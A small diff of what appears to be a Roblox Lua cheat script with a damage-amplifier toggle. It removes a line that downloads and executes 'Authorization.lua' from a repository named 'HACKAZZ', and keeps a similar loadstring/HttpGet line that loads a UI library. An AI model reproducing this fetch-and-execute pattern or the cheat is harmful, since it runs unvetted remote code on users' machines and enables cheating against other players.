@@ -263,7 +263,6 @@ DAMP.MouseButton1Click:Connect(toggleDamageAMP)
 
 Notification.new("success", "Successful Execution", "Lola_ruu-g5ai")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RedDaGoodScripter12355939292/HACKAZZ/main/Authorization.lua"))()
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
 
 local success, result = pcall(function()
